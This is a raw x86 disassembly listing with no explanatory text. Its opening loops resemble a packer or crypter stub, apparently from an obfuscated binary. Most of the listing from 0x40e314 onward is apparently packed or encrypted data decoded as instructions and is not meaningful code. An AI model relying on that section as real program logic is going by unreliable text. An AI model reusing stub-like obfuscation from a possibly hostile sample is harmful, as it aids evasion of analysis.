  40e244:	cmp    DWORD PTR ds:0x4337a7,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x4337a7
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x4337a7,ecx
  40e279:	cmp    DWORD PTR ds:0x4337a7,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x4337db,0x4336c7
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x43376b,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x43376b
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x43376b,edx
  40e2c3:	cmp    DWORD PTR ds:0x43376b,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x4339f4
  40e2d5:	push   0x4339f4
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x43376b,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	sbb    eax,0xc5f471c6
  40e325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e326:	jl     0x40e3a4
  40e328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e329:	jns    0x40e3a7
  40e32b:	jl     0x40e34a
  40e32d:	jcxz   0x40e34d
  40e330:	mov    WORD PTR [eax+0x4a6956a5],ss
  40e336:	push   ecx
  40e337:	out    0x99,eax
  40e339:	xor    bl,0xa3
  40e33c:	(bad)  
  40e33d:	daa    
  40e33e:	xchg   BYTE PTR [ecx-0x78],ch
  40e341:	jne    0x40e2d9
  40e343:	lods   al,BYTE PTR ds:[esi]
  40e344:	dec    edi
  40e345:	mov    ch,0xac
  40e347:	outs   dx,DWORD PTR ds:[esi]
  40e348:	pop    esi
  40e349:	mov    ds:0xee2d5d07,al
  40e34e:	lea    ebx,[esi-0x51f663ce]
  40e354:	rcl    BYTE PTR [ebp+0x76756166],1
  40e35a:	js     0x40e355
  40e35c:	lahf   
  40e35d:	and    ah,al
  40e35f:	xor    dh,BYTE PTR [ecx+esi*4+0x70]
  40e363:	push   esp
  40e364:	push   0x53b3b8d3
  40e369:	aaa    
  40e36a:	mov    esi,0x6be2f0b3
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	std    
  40e371:	call   0x96d4:0x82d15e5a
  40e378:	mov    ebp,0xabe18fde
  40e37d:	repnz std 
  40e37f:	or     cl,BYTE PTR [eax]
  40e381:	pop    es
  40e382:	int3   
  40e383:	lahf   
  40e384:	ins    BYTE PTR es:[edi],dx
  40e385:	retf   
  40e386:	mov    edi,0x7ad123d3
  40e38b:	mov    ebx,0xd0e7f5b4
  40e390:	stos   DWORD PTR es:[edi],eax
  40e391:	(bad)  
  40e392:	pop    esp
  40e393:	into   
  40e394:	aaa    
  40e395:	lods   al,BYTE PTR ds:[esi]
  40e396:	gs mov cl,0xcd
  40e399:	inc    ebp
  40e39a:	aad    0x9c
  40e39c:	xchg   ecx,eax
  40e39d:	pusha  
  40e39e:	mov    eax,0x4456f7df
  40e3a3:	xor    al,0x5e
  40e3a5:	int    0xae
  40e3a7:	fnstsw WORD PTR [edx-0x26]
  40e3aa:	mov    ch,0xe3
  40e3ac:	xchg   edi,eax
  40e3ad:	xchg   BYTE PTR ds:0x21a894e0,dh
  40e3b3:	push   cs
  40e3b4:	retf   
  40e3b5:	popa   
  40e3b6:	fs jge 0x40e3eb
  40e3b9:	mov    ds:0x7f18679e,eax
  40e3be:	les    eax,FWORD PTR [ebx]
  40e3c0:	adc    eax,0x49ee8e85
  40e3c5:	int    0x4a
  40e3c7:	pop    edi
  40e3c8:	mov    ds,WORD PTR [ebx]
  40e3ca:	test   eax,0x12fbaa31
  40e3cf:	repz out 0x2c,eax
  40e3d2:	lds    eax,FWORD PTR [ebp+0x74e91bcc]
  40e3d8:	adc    al,0xf1
  40e3da:	push   ebp
  40e3db:	jae    0x40e3fe
  40e3dd:	gs daa 
  40e3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3e0:	stos   BYTE PTR es:[edi],al
  40e3e1:	and    edi,edi
  40e3e3:	(bad)  
  40e3e5:	mov    al,ds:0x20d8e25b
  40e3ea:	dec    ebp
  40e3eb:	mov    bh,0x8d
  40e3ed:	xor    edx,DWORD PTR [edi+eax*2]
  40e3f0:	sbb    eax,0xb3af4cb7
  40e3f5:	inc    dx
  40e3f7:	inc    edi
  40e3f8:	add    bl,ah
  40e3fa:	pop    ds
  40e3fb:	lods   al,BYTE PTR ds:[esi]
  40e3fc:	nop
  40e3fd:	add    edi,esp
  40e3ff:	sbb    al,BYTE PTR [ebx-0x5352415b]
  40e405:	sti    
  40e406:	xlat   BYTE PTR ds:[ebx]
  40e407:	(bad)  
  40e408:	shr    BYTE PTR [eax+0x71],cl
  40e40b:	push   ebx
  40e40c:	imul   esi,DWORD PTR [ebx-0x14f8a430],0x2f0fc0e6
  40e416:	push   esi
  40e417:	int3   
  40e418:	cli    
  40e419:	adc    DWORD PTR [edi+0x5f],edx
  40e41c:	mov    DWORD PTR [esi],esp
  40e41e:	std    
  40e41f:	sub    eax,0xde1f7729
  40e424:	call   0xea08ed2b
  40e429:	jmp    0x17be:0x9ff84189
  40e430:	ds push edx
  40e432:	call   0x9906403
  40e437:	icebp  
  40e438:	cmc    
  40e439:	rol    DWORD PTR [ebx+0x600d1772],1
  40e43f:	sbb    esp,DWORD PTR [ebx-0x5]
  40e442:	mov    ds:0x30fd9700,al
  40e447:	mov    al,ds:0x2cd041f4
  40e44c:	pop    ebx
  40e44d:	in     al,dx
  40e44e:	sub    al,0x13
  40e450:	push   edi
  40e451:	xor    al,0x53
  40e453:	pushf  
  40e454:	pop    ss
  40e455:	sbb    ch,cl
  40e457:	mov    esp,DWORD PTR [edi]
  40e459:	adc    ecx,ebx
  40e45b:	cmp    al,0xd8
  40e45d:	pop    eax
  40e45e:	sbb    DWORD PTR [ecx-0x18326398],0xd88879e8
  40e468:	mov    ebp,0x54b06a08
  40e46d:	into   
  40e46e:	mov    ah,dl
  40e470:	add    BYTE PTR [edx-0x44],al
  40e473:	inc    esp
  40e474:	(bad)  
  40e475:	xor    ch,BYTE PTR [edi]
  40e477:	sbb    ebx,edi
  40e479:	xor    al,0x54
  40e47b:	sub    dl,cl
  40e47d:	bound  eax,QWORD PTR [esi+0x2916319b]
  40e483:	pop    edx
  40e484:	(bad)  [edi+ebx*1-0x79]
  40e488:	ror    ebp,0x9d
  40e48b:	sahf   
  40e48c:	or     DWORD PTR ds:0xd58879a5,edx
  40e492:	adc    BYTE PTR [ecx+0x45148452],ah
  40e498:	imul   esp,DWORD PTR [edi+0xeceeafa],0x2d9f1f8d
  40e4a2:	sub    DWORD PTR [edx],ebp
  40e4a4:	sti    
  40e4a5:	in     al,0xd7
  40e4a7:	inc    ebp
  40e4a8:	std    
  40e4a9:	pop    eax
  40e4aa:	mov    ebp,0xb87b7c2
  40e4af:	sub    eax,0x9c18cde7
  40e4b4:	cmp    al,0xd8
  40e4b6:	daa    
  40e4b7:	popf   
  40e4b8:	mov    DWORD PTR [esi],esi
  40e4ba:	pop    ebp
  40e4bb:	ficom  DWORD PTR [ebx+ecx*2]
  40e4be:	test   al,0xa4
  40e4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4c1:	cmc    
  40e4c2:	add    edx,DWORD PTR [edi-0x66]
  40e4c5:	cmc    
  40e4c6:	mov    al,ds:0xbd37fb64
  40e4cb:	in     al,0xec
  40e4cd:	mov    eax,ebp
  40e4cf:	mov    ecx,0x2ede8675
  40e4d4:	xchg   esp,eax
  40e4d5:	xchg   esi,ecx
  40e4d7:	or     cl,0x8c
  40e4da:	not    BYTE PTR [edx-0x65]
  40e4dd:	and    DWORD PTR [ebp+0x18],esi
  40e4e0:	push   ecx
  40e4e2:	(bad)  
  40e4e3:	sbb    al,0x9e
  40e4e5:	add    eax,ebx
  40e4e7:	arpl   WORD PTR [edx-0x19],sp
  40e4ea:	and    al,0x78
  40e4ec:	nop
  40e4ed:	addr16 jo 0x40e514
  40e4f0:	jmp    FWORD PTR [edx-0x5d2941af]
  40e4f6:	xor    al,0xb5
  40e4f8:	fstp   st(4)
  40e4fa:	mov    dh,0x6c
  40e4fc:	cmp    DWORD PTR [ecx-0x3f1b20a],edx
  40e502:	mov    ch,0xf8
  40e504:	cdq    
  40e505:	cmc    
  40e506:	add    cl,dh
  40e508:	imul   esi,DWORD PTR [edx],0xdb0b83ff
  40e50e:	sbb    eax,0x18ddc9c0
  40e513:	mov    edx,0xbc658b08
  40e518:	dec    eax
  40e519:	xor    al,0x38
  40e51b:	xchg   ebp,eax
  40e51c:	adc    al,0xb0
  40e51e:	push   edi
  40e51f:	add    al,0xb3
  40e521:	pop    eax
  40e522:	and    bl,0xcb
  40e525:	test   DWORD PTR ds:0x2e9e06be,edx
  40e52b:	add    eax,0xabb909dd
  40e530:	les    ebx,FWORD PTR [eax]
  40e532:	dec    DWORD PTR [ecx]
  40e534:	adc    bl,BYTE PTR [edi+0x40be5e87]
  40e53a:	sar    ecx,1
  40e53c:	push   cs
  40e53d:	xchg   DWORD PTR [eax+esi*1-0x34e8dd5b],edi
  40e544:	test   BYTE PTR [ecx],0x24
  40e547:	out    0x58,al
  40e549:	push   ecx
  40e54a:	aad    0x83
  40e54c:	and    bl,BYTE PTR [ebp-0x12]
  40e54f:	fwait
  40e550:	mov    ebp,0x9fe9e13e
  40e555:	pop    ebp
  40e556:	xor    ebp,DWORD PTR [edx+0x19]
  40e559:	and    BYTE PTR [ebx+esi*2-0x7c],0xe5
  40e55e:	mov    WORD PTR [eax-0x4334593b],es
  40e564:	dec    esp
  40e565:	push   ebx
  40e566:	inc    ebx
  40e567:	or     DWORD PTR [edi+eiz*8+0x7],edx
  40e56b:	aas    
  40e56c:	scas   al,BYTE PTR es:[edi]
  40e56d:	push   ebx
  40e56e:	xchg   ebp,eax
  40e56f:	(bad)  
  40e570:	std    
  40e571:	cld    
  40e572:	sbb    eax,0x920da2dc
  40e577:	lahf   
  40e578:	cmp    al,0xad
  40e57a:	daa    
  40e57b:	call   DWORD PTR [esi+ecx*2]
  40e57e:	sbb    bl,dh
  40e580:	add    bh,BYTE PTR [ecx-0x37]
  40e583:	jp     0x40e5fa
  40e585:	lock push edx
  40e587:	pop    eax
  40e588:	sub    BYTE PTR [edx-0x6c],bh
  40e58b:	fcomp  QWORD PTR [edx-0x6d]
  40e58e:	aas    
  40e58f:	jne    0x40e546
  40e591:	pop    ebx
  40e592:	shl    BYTE PTR [edi-0x4f],0x14
  40e596:	dec    esi
  40e597:	xchg   DWORD PTR [ebp-0x5c679e95],ecx
  40e59d:	sbb    ebp,ebp
  40e59f:	retf   
  40e5a0:	adc    BYTE PTR [ebx],ah
  40e5a2:	jne    0x40e5e5
  40e5a4:	add    DWORD PTR [esi-0x404edafe],esi
  40e5aa:	mov    dh,0x50
  40e5ac:	ins    DWORD PTR es:[edi],dx
  40e5ad:	jl     0x40e606
  40e5af:	mov    dh,0xb5
  40e5b1:	retf   0x54f2
  40e5b4:	mov    ds:0x9201bad0,eax
  40e5b9:	cmp    DWORD PTR [ecx+edx*1+0x35],ebp
  40e5bd:	mov    al,0x1f
  40e5bf:	icebp  
  40e5c0:	dec    esi
  40e5c1:	and    BYTE PTR [esi],0xec
  40e5c4:	push   es
  40e5c5:	test   al,0xfc
  40e5c7:	pop    esp
  40e5c8:	sub    esi,DWORD PTR [ebp+edi*8+0x17a85d77]
  40e5cf:	dec    edx
  40e5d0:	icebp  
  40e5d1:	cmp    al,0x3a
  40e5d3:	sahf   
  40e5d4:	rol    BYTE PTR [ebx+0x2a7dda71],0x51
  40e5db:	or     al,BYTE PTR [edi+0x59ee3349]
  40e5e1:	jnp    0x40e63a
  40e5e3:	out    0x57,eax
  40e5e5:	push   ebx
  40e5e6:	in     al,0x6b
  40e5e8:	or     al,0xa2
  40e5ea:	(bad)  
  40e5eb:	push   0x971aaceb
  40e5f0:	inc    esp
  40e5f1:	sbb    al,0x2b
  40e5f3:	leave  
  40e5f4:	fst    DWORD PTR [edi-0x6adb4e94]
  40e5fa:	mov    esp,0xd50d139d
  40e5ff:	js     0x40e67f
  40e601:	scas   al,BYTE PTR es:[edi]
  40e602:	xchg   BYTE PTR [edx+ebx*2],al
  40e605:	cmp    eax,0x72877bf7
  40e60a:	aas    
  40e60b:	rcl    DWORD PTR [edi-0x21cb9206],1
  40e611:	mov    ebx,DWORD PTR [ecx]
  40e613:	iret   
  40e614:	mov    bh,0xb2
  40e616:	xchg   ah,al
  40e618:	cli    
  40e619:	push   0x52
  40e61b:	outs   dx,DWORD PTR ds:[esi]
  40e61c:	mov    ds:0x94d0dc76,eax
  40e621:	inc    esp
  40e622:	pushf  
  40e623:	mov    al,BYTE PTR [ebx+0x1d]
  40e626:	and    ah,BYTE PTR [esi+0x1ec1411f]
  40e62c:	mov    dl,0x65
  40e62e:	(bad)  
  40e62f:	push   eax
  40e630:	fild   QWORD PTR [edi+0x5e87c234]
  40e637:	in     eax,dx
  40e638:	mov    cs,WORD PTR [edi+edx*1-0x2a]
  40e63c:	neg    BYTE PTR [ebx+0x3]
  40e63f:	dec    esi
  40e640:	xlat   BYTE PTR ds:[ebx]
  40e641:	aaa    
  40e642:	jnp    0x40e6a0
  40e644:	sbb    al,BYTE PTR [edi*2-0x3c8a8ebf]
  40e64b:	data16 fistp QWORD PTR [edx+0x125aa17b]
  40e652:	lds    ecx,FWORD PTR [edi+0x6ab06366]
  40e658:	rcl    DWORD PTR [ecx+eiz*8],cl
  40e65b:	out    dx,al
  40e65c:	and    DWORD PTR [edx-0x52],eax
  40e65f:	mov    DWORD PTR [ecx+0x4b],edx
  40e662:	enter  0x7b9,0x58
  40e666:	sbb    dl,BYTE PTR [ebx+esi*1+0x7e]
  40e66a:	push   ss
  40e66b:	aas    
  40e66c:	loop   0x40e64e
  40e66e:	pushf  
  40e66f:	push   cs
  40e670:	jge    0x40e664
  40e672:	mov    edx,0x6b1747a6
  40e677:	sub    al,0x29
  40e679:	or     dh,BYTE PTR [ebp+0x5f]
  40e67c:	mov    bl,0x55
  40e67e:	lahf   
  40e67f:	pushf  
  40e680:	sub    esp,ebp
  40e682:	aas    
  40e683:	lahf   
  40e684:	int3   
  40e685:	mov    BYTE PTR [edi],dl
  40e687:	sub    bl,BYTE PTR [ebx]
  40e689:	scas   eax,DWORD PTR es:[edi]
  40e68a:	mov    eax,0x92716572
  40e68f:	xor    eax,0x55f8dd2
  40e694:	pminsw mm6,QWORD PTR [ebp-0x62172913]
  40e69b:	(bad)  
  40e69c:	sahf   
  40e69d:	ja     0x40e71c
  40e69f:	mov    cl,0xdd
  40e6a1:	or     DWORD PTR gs:[edi-0x30],0x4ac08892
  40e6a9:	or     al,0xe1
  40e6ab:	mov    dl,0x23
  40e6ad:	add    BYTE PTR [ebx-0x42],ah
  40e6b0:	inc    edx
  40e6b1:	or     eax,0x1828b6f6
  40e6b6:	fcmovbe st,st(2)
  40e6b8:	xchg   ecx,eax
  40e6b9:	jo     0x40e6f1
  40e6bb:	xchg   BYTE PTR [edi-0x53dc7f16],bh
  40e6c1:	ins    DWORD PTR es:[edi],dx
  40e6c2:	outs   dx,DWORD PTR ds:[esi]
  40e6c3:	add    esp,DWORD PTR [edi-0x69]
  40e6c6:	imul   ebx,DWORD PTR [ecx],0x7d
  40e6c9:	jecxz  0x40e6df
  40e6cb:	push   ebx
  40e6cc:	shl    dh,1
  40e6ce:	(bad)  
  40e6cf:	call   0x89ff:0x390f3b3b
  40e6d6:	add    ecx,ebp
  40e6d8:	rol    DWORD PTR [ebx],0x0
  40e6db:	add    BYTE PTR [ebx],cl
  40e6dd:	push   0x67
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e6c6
  40e6e9:	xchg   BYTE PTR [ebx-0x29],cl
  40e6ec:	ins    BYTE PTR es:[edi],dx
  40e6ed:	mov    eax,ds:0x79a77c7c
  40e6f2:	jl     0x40e770
  40e6f4:	loope  0x40e6c6
  40e6f6:	lods   al,BYTE PTR ds:[esi]
  40e6f7:	inc    ebx
  40e6f8:	out    dx,eax
  40e6f9:	inc    edx
  40e6fa:	cmp    eax,0x86b5af03
  40e6ff:	adc    al,0x3
  40e701:	imul   eax,edi,0x1d
  40e704:	dec    ebp
  40e705:	cmp    eax,0x568bad7d
  40e70a:	shr    DWORD PTR [edx+0x71],cl
  40e70d:	adc    DWORD PTR [eax],ebp
  40e70f:	fnstsw WORD PTR [eax+0x1742fa35]
  40e715:	and    al,0xa2
  40e717:	jge    0x40e765
  40e719:	js     0x40e69e
  40e71b:	fcmovnu st,st(7)
  40e71d:	xor    DWORD PTR [ebp+edi*1-0xe94c381],edi
  40e724:	adc    BYTE PTR [esi+ebp*2-0x1c],bh
  40e728:	outs   dx,BYTE PTR ds:[esi]
  40e729:	stc    
  40e72a:	(bad)  
  40e72b:	jmp    0x2c57a44e
  40e730:	push   ebx
  40e731:	shr    DWORD PTR [edx+ebx*8+0x7ff4c0a3],0x85
  40e739:	or     al,BYTE PTR [ebx+0x1d]
  40e73c:	lds    edi,FWORD PTR [edi+edi*8-0x15f8a95b]
  40e743:	inc    edi
  40e744:	imul   ecx,DWORD PTR [eax],0x9a368389
  40e74a:	int    0xb
  40e74c:	push   ecx
  40e74d:	nop
  40e74e:	dec    ebp
  40e74f:	sub    al,0x54
  40e751:	(bad)  
  40e752:	push   ss
  40e753:	pushf  
  40e754:	mov    bl,0xa4
  40e756:	inc    ebx
  40e757:	fadd   DWORD PTR [edi+0x449b82bb]
  40e75d:	or     BYTE PTR [edi+0x76],dh
  40e760:	inc    ecx
  40e761:	mov    eax,ds:0xabaa2767
  40e766:	lock inc ecx
  40e768:	push   0xea52355c
  40e76d:	daa    
  40e76e:	mov    al,0xcc
  40e770:	or     eax,0x7e7a22cd
  40e775:	loope  0x40e75f
  40e777:	pop    ds
  40e778:	sub    eax,0x914ae3eb
  40e77d:	ins    DWORD PTR es:[edi],dx
  40e77e:	sbb    DWORD PTR [edx],ecx
  40e780:	or     dl,BYTE PTR [edx]
  40e782:	inc    ebx
  40e783:	scas   al,BYTE PTR es:[edi]
  40e784:	loope  0x40e7bf
  40e786:	sub    DWORD PTR [edi-0x17],esi
  40e789:	mov    ebx,0xd5224098
  40e78e:	stos   DWORD PTR es:[edi],eax
  40e78f:	xchg   BYTE PTR [ebx+0x57],al
  40e792:	mov    ch,0xd2
  40e794:	lods   eax,DWORD PTR ds:[esi]
  40e795:	cmp    esp,DWORD PTR [ecx-0x5724fd58]
  40e79b:	cmp    ebp,DWORD PTR [esi-0x233e2b38]
  40e7a1:	or     esp,DWORD PTR ds:0x46ec893e
  40e7a7:	cmp    ebx,edi
  40e7a9:	gs and al,0x18
  40e7ac:	xchg   esi,eax
  40e7ad:	inc    ebp
  40e7ae:	add    al,0xff
  40e7b0:	int3   
  40e7b1:	xchg   esp,eax
  40e7b2:	adc    edx,DWORD PTR [ebx]
  40e7b4:	fwait
  40e7b5:	pop    ds
  40e7b6:	mov    esi,0xfa6026f5
  40e7bb:	test   bl,bh
  40e7bd:	or     eax,0xde8d4b35
  40e7c2:	pop    edi
  40e7c3:	mov    ebp,0x6cbbe8e
  40e7c8:	jmp    0x5c0f:0x91e1efc4
  40e7cf:	pop    ds
  40e7d0:	jo     0x40e817
  40e7d2:	mov    edi,DWORD PTR [eax+eiz*8+0x2f]
  40e7d6:	sar    BYTE PTR [ebx],1
  40e7d8:	retf   
  40e7d9:	fistp  QWORD PTR [ebx]
  40e7db:	fistp  WORD PTR [eax+0xc8b1b71]
  40e7e1:	push   ds
  40e7e2:	inc    ebx
  40e7e3:	inc    edi
  40e7e4:	dec    esp
  40e7e5:	jbe    0x40e812
  40e7e7:	adc    BYTE PTR [eax],cl
  40e7e9:	outs   dx,BYTE PTR ds:[esi]
  40e7ea:	inc    ebx
  40e7eb:	xor    esp,DWORD PTR [esi+0x64]
  40e7ee:	test   al,0xb2
  40e7f0:	push   cs
  40e7f1:	std    
  40e7f2:	xlat   BYTE PTR ds:[ebx]
  40e7f3:	jb     0x40e785
  40e7f5:	or     bl,BYTE PTR [edi+0x21618392]
  40e7fb:	pop    ecx
  40e7fc:	in     al,0xcb
  40e7fe:	arpl   WORD PTR [ebx+0x4d62a47f],sp
  40e804:	scas   eax,DWORD PTR es:[edi]
  40e805:	in     al,0x7a
  40e807:	jmp    0x65ee0f03
  40e80c:	addr16 pop esp
  40e80e:	(bad)  
  40e80f:	mov    al,0x22
  40e811:	sub    al,0xd9
  40e813:	pop    edi
  40e814:	cld    
  40e815:	cdq    
  40e816:	sub    BYTE PTR [edi+0x43],bl
  40e819:	cmp    eax,DWORD PTR [edx]
  40e81b:	lock add eax,0x38061a93
  40e821:	xor    BYTE PTR [ecx+0x7c],ah
  40e824:	int    0x5
  40e826:	xchg   ebp,eax
  40e827:	xchg   edi,eax
  40e828:	mov    esi,0x9e7c2d52
  40e82d:	jo     0x40e7b8
  40e82f:	xor    al,0x84
  40e831:	mov    gs,WORD PTR [edi]
  40e833:	and    eax,0x87c83aeb
  40e838:	sbb    DWORD PTR [ecx-0x1222e4f0],edx
  40e83e:	and    al,0x69
  40e840:	mov    edx,0x99dd906a
  40e845:	push   0xd676cf95
  40e84a:	ffree  st(5)
  40e84c:	ret    0xcef2
  40e84f:	leave  
  40e850:	repz addr16 sbb al,0x99
  40e854:	fnstsw WORD PTR [edx]
  40e856:	nop
  40e857:	mov    eax,0x78f8c8a9
  40e85c:	adc    edx,DWORD PTR [ebx-0x7d]
  40e85f:	jbe    0x40e7e4
  40e861:	pop    es
  40e862:	int    0xc0
  40e864:	fidiv  WORD PTR [edx-0x76]
  40e867:	mov    bl,0x99
  40e869:	inc    ecx
  40e86a:	lahf   
  40e86b:	pop    eax
  40e86c:	add    BYTE PTR [ebx-0x6c69842d],dh
  40e872:	aas    
  40e873:	cld    
  40e874:	adc    esp,edi
  40e876:	sbb    eax,0x7761e0ed
  40e87b:	fiadd  DWORD PTR [ecx+eax*2]
  40e87e:	and    eax,0x8f062f3b
  40e883:	cmp    ah,BYTE PTR [esi]
  40e885:	test   DWORD PTR es:[ecx-0x7b4dc7d],0x4d8ce83d
  40e890:	push   ss
  40e891:	ja     0x40e8e2
  40e893:	popf   
  40e894:	push   esi
  40e895:	adc    ecx,edi
  40e897:	or     eax,0x788a37f7
  40e89c:	xor    DWORD PTR [edi-0xbb48238],ebx
  40e8a2:	lock popa 
  40e8a4:	pop    esp
  40e8a5:	xor    al,0x99
  40e8a7:	dec    ecx
  40e8a8:	shl    DWORD PTR [eax+eax*8-0x1e],1
  40e8ac:	push   ss
  40e8ad:	mov    esp,0xd863ede2
  40e8b2:	icebp  
  40e8b3:	int    0x3d
  40e8b5:	mov    ebx,0x5b90116f
  40e8ba:	adc    DWORD PTR [edx-0x6c],esp
  40e8bd:	or     DWORD PTR [edx+0x15965c54],edi
  40e8c3:	ret    
  40e8c4:	dec    ecx
  40e8c5:	(bad)  
  40e8c7:	jmp    0xb1a245c6
  40e8cc:	pop    eax
  40e8cd:	retf   
  40e8ce:	jl     0x40e87b
  40e8d0:	pop    eax
  40e8d1:	sub    DWORD PTR [ebp-0x20],esi
  40e8d4:	cwde   
  40e8d5:	fadd   st,st(4)
  40e8d7:	test   BYTE PTR [eax-0x26],dh
  40e8da:	shl    DWORD PTR [eax+ebx*1+0x21],1
  40e8de:	mul    DWORD PTR [eax-0xa27b3e7]
  40e8e4:	xor    BYTE PTR [edi+esi*2-0x18],0xc2
  40e8e9:	ret    0x30b5
  40e8ec:	loope  0x40e95c
  40e8ee:	jmp    0x6565358a
  40e8f3:	in     al,0x3c
  40e8f5:	mov    BYTE PTR [edi-0x7f],0x15
  40e8f9:	or     BYTE PTR [esi],0x8c
  40e8fc:	mov    ds:0xfc7ffd8c,eax
  40e901:	and    ebp,edx
  40e903:	or     eax,0x20dadcf3
  40e908:	mov    esp,0x6bf3c4f4
  40e90d:	fnsave [ecx]
  40e90f:	inc    edi
  40e910:	xchg   esi,eax
  40e911:	imul   esp,DWORD PTR [esi-0x5b],0xffffffa2
  40e915:	mov    al,ds:0xb4c5dbb6
  40e91a:	sti    
  40e91b:	std    
  40e91c:	sti    
  40e91d:	sub    eax,0x941d2b36
  40e922:	lods   al,BYTE PTR ds:[esi]
  40e923:	and    BYTE PTR [esi],cl
  40e925:	fs sub al,0x59
  40e928:	(bad)  
  40e92a:	les    esp,FWORD PTR [edi+0x3f]
  40e92d:	inc    edx
  40e92e:	sbb    eax,0x6f0074e7
  40e933:	fst    QWORD PTR [edi-0x39fb139e]
  40e939:	pop    esi
  40e93a:	pop    eax
  40e93b:	nop
  40e93c:	hlt    
  40e93d:	dec    ecx
  40e93e:	test   eax,0x97078f9b
  40e943:	imul   ecx,ebp,0xffffff88
  40e946:	shr    DWORD PTR [eax],0x37
  40e949:	jecxz  0x40e957
  40e94b:	jae    0x40e9b8
  40e94d:	in     eax,0x94
  40e94f:	(bad)  [ebx]
  40e951:	into   
  40e952:	xlat   BYTE PTR ds:[ebx]
  40e953:	pop    ecx
  40e954:	(bad)  
  40e955:	mov    al,0x16
  40e957:	pop    ecx
  40e958:	xchg   esp,eax
  40e959:	mov    edi,0x74070375
  40e95e:	and    DWORD PTR [ecx],0x86f06b50
  40e964:	stos   DWORD PTR es:[edi],eax
  40e965:	sbb    al,0x4a
  40e967:	data16 ins BYTE PTR es:[edi],dx
  40e969:	dec    esi
  40e96a:	adc    al,0x2c
  40e96c:	dec    ebp
  40e96d:	mov    esp,DWORD PTR fs:[edi+0x21]
  40e971:	cli    
  40e972:	hlt    
  40e973:	push   ecx
  40e974:	sahf   
  40e975:	(bad)  
  40e976:	pushw  ds
  40e978:	xchg   ebp,eax
  40e979:	add    dl,ah
  40e97b:	cld    
  40e97c:	fs sub al,0xb7
  40e97f:	dec    ecx
  40e980:	mov    edi,0xacd695a0
  40e985:	xchg   edi,eax
  40e986:	mov    cl,0x3d
  40e988:	rcr    ch,1
  40e98a:	push   ss
  40e98b:	inc    edi
  40e98c:	int3   
  40e98d:	mov    ecx,0x1fe1540c
  40e992:	(bad)  
  40e993:	into   
  40e994:	shr    DWORD PTR [esi+0x7263604c],0x3b
  40e99b:	adc    DWORD PTR [ecx],eax
  40e99d:	loope  0x40e9a9
  40e99f:	je     0x40e9d3
  40e9a1:	sub    al,0x6a
  40e9a3:	jp     0x40e980
  40e9a5:	xor    BYTE PTR [ebx+0x3478b823],0x45
  40e9ac:	jmp    0x3207:0x287e2136
  40e9b3:	sub    edx,DWORD PTR [ebx-0x12]
  40e9b6:	add    BYTE PTR [eax-0x26],bh
  40e9b9:	fs mov ebp,0x6e90fe45
  40e9bf:	(bad)  
  40e9c1:	pop    ecx
  40e9c2:	and    eax,0xb5fd4d75
  40e9c7:	mov    al,0xcf
  40e9c9:	call   0xe6d2:0x926f63a5
  40e9d0:	xchg   BYTE PTR [ecx+ecx*1-0x74],cl
  40e9d4:	popf   
  40e9d5:	bound  edx,QWORD PTR [esp+ebp*1]
  40e9d8:	ins    BYTE PTR es:[edi],dx
  40e9d9:	scas   al,BYTE PTR es:[edi]
  40e9da:	add    eax,0x9bce3263
  40e9df:	sub    BYTE PTR [ebx],dh
  40e9e1:	cmp    ebp,0xfffffff9
  40e9e4:	pusha  
  40e9e5:	std    
  40e9e6:	sar    DWORD PTR ds:0x6518f713,0x22
  40e9ed:	and    BYTE PTR [esi],al
  40e9ef:	adc    ah,bl
  40e9f1:	loopne 0x40ea31
  40e9f3:	ins    DWORD PTR es:[edi],dx
  40e9f4:	ficomp DWORD PTR ds:0xc79b985a
  40e9fa:	stos   BYTE PTR es:[edi],al
  40e9fb:	shl    BYTE PTR [eax+0x2813fa1f],0x34
  40ea02:	mov    al,0x4b
  40ea04:	test   al,0x65
  40ea06:	sub    DWORD PTR [esi+ebp*1-0x25],ecx
  40ea0a:	sar    BYTE PTR [eax-0x4f],0xd5
  40ea0e:	imul   esi,esi,0x91c15935
  40ea14:	mov    edx,0x8435c7ae
  40ea19:	push   ecx
  40ea1a:	lods   eax,DWORD PTR ds:[esi]
  40ea1b:	ret    
  40ea1c:	fs enter 0x57b6,0x81
  40ea21:	jmp    0xe1aeadef
  40ea26:	pop    ss
  40ea27:	aaa    
  40ea28:	aam    0x99
  40ea2a:	je     0x40e9cf
  40ea2c:	outs   dx,BYTE PTR ds:[esi]
  40ea2d:	cmp    eax,0x1f97e7f6
  40ea32:	push   edi
  40ea33:	cli    
